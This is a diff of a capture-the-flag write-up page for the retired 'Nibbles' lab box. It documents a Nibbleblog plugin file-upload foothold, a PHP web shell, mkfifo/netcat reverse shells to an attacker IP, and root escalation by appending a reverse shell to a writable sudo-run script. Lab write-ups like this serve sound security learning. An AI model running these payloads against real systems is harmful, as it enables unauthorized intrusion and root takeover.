@@ -5,6 +5,14 @@ description: "Review the Nibbleblog upload foothold, writable sudo script escala
 keywords: ["nibbles", "nibbleblog", "cve-2015-6967", "file upload", "sudo", "monitor.sh", "box report"]
 ---
 
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
+
 {/* VAULT_QUICK_NAV_START */}
 
 **Jump to a section**
@@ -13,6 +21,8 @@ keywords: ["nibbles", "nibbleblog", "cve-2015-6967", "file upload", "sudo", "mon
 
 {/* VAULT_QUICK_NAV_END */}
 
+{/* Generated from Boxes/Nibbles.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
 <Info>
 **Box metadata**
 
@@ -20,12 +30,12 @@ keywords: ["nibbles", "nibbleblog", "cve-2015-6967", "file upload", "sudo", "mon
 - **OS:** Linux
 - **Difficulty:** Easy
 - **Status:** Retired
-- **Released:** 2018-01-13
-- **Started:** 2026-04-22 
-- **User flag:** 
-- **Root flag:** 
+- **Released:** 2018-01-13&lt;!-- YYYY-MM-DD -->
+- **Started:** 2026-04-22 &lt;!-- HH:MM -->
+- **User flag:** &lt;!-- 2026-04-22 HH:MM -->
+- **Root flag:** &lt;!-- 2026-04-22 HH:MM -->
 - **Total time:** 15:30
-- **Walkthrough used?** Yes
+- **Walkthrough used?** Yes&lt;!-- No / Yes (where did you get stuck?) -->
 - **Tags:** #linux #web #cms #nibbleblog #file-upload #sudo-misconfig
 </Info>
 
@@ -131,35 +141,35 @@ Status code reminder: **200** = resource served; **301** = directory redirect (d
 
 3. **Uploaded a test PHP payload via the My Image plugin.** First, `shell.php`:
 
-    ```php
-    <?php system('id'); ?>
-    ```
+```php
+<?php system('id'); ?>
+```
 
     Uploading through Plugins → My Image produced warnings but also a "changes saved successfully" message. The file landed at a predictable path — requesting it via curl confirmed execution:
 
-    ```bash
-    curl http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php
-    ```
+```bash
+curl http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php
+```
 
 4. **Replaced the test payload with a reverse shell.** Using attacker tun0 IP `10.10.14.174` and port `9443`:
 
-    ```php
-    <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.174 9443 >/tmp/f'); ?>
-    ```
+```php
+<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.174 9443 >/tmp/f'); ?>
+```
 
     Listener on attacker:
 
-    ```bash
-    nc -lvnp 9443
-    ```
+```bash
+nc -lvnp 9443
+```
 
     Re-uploaded through My Image, then requested `image.php` in the browser — caught the shell.
 
 5. **Stabilized the shell** (the raw shell is too limited to work in):
 
-    ```bash
-    python3 -c 'import pty; pty.spawn("/bin/bash")'
-    ```
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
 **User:** `nibbler`
 **user.txt:** `67f2d04b4a10da7deeaaab8ed4dfe5d9` ✅
@@ -204,30 +214,30 @@ linpeas confirmed the same sudo misconfiguration.
 
 2. **Extracted `monitor.sh`.** The script lived inside `personal.zip` in `/home/nibbler` — unzipped it:
 
-    ```bash
-    cd /home/nibbler
-    unzip personal.zip
-    ls -la personal/stuff/monitor.sh   # confirmed writable by nibbler
-    ```
+```bash
+cd /home/nibbler
+unzip personal.zip
+ls -la personal/stuff/monitor.sh   # confirmed writable by nibbler
+```
 
 3. **Appended a reverse-shell payload to `monitor.sh`** (append, don't overwrite, so the script still functions normally):
 
-    ```bash
-    echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.174 8443 >/tmp/f' \
-      | tee -a /home/nibbler/personal/stuff/monitor.sh
-    ```
+```bash
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.174 8443 >/tmp/f' \
+  | tee -a /home/nibbler/personal/stuff/monitor.sh
+```
 
 4. **Started a second listener on the attacker:**
 
-    ```bash
-    nc -lvnp 8443
-    ```
+```bash
+nc -lvnp 8443
+```
 
 5. **Triggered the script as root via sudo:**
 
-    ```bash
-    sudo /home/nibbler/personal/stuff/monitor.sh
-    ```
+```bash
+sudo /home/nibbler/personal/stuff/monitor.sh
+```
 
 <Warning>
 **Path gotcha**
@@ -282,10 +292,10 @@ cat root.txt
 
 ## 🔗 Linked modules
 
-- **Modules/Footprinting**
-- **Modules/File_Transfers**
-- **Modules/Attacking_Common_Applications**
-- **Modules/Linux_Privilege_Escalation**
+- [Footprinting](/modules/footprinting)
+- [File Transfers](/post-exploitation/file-transfers-cheat-sheet)
+- [File Upload](/web/file-upload)
+- [Linux Privilege Escalation](/privesc/linux-privesc-checklist)
 
 ---
 
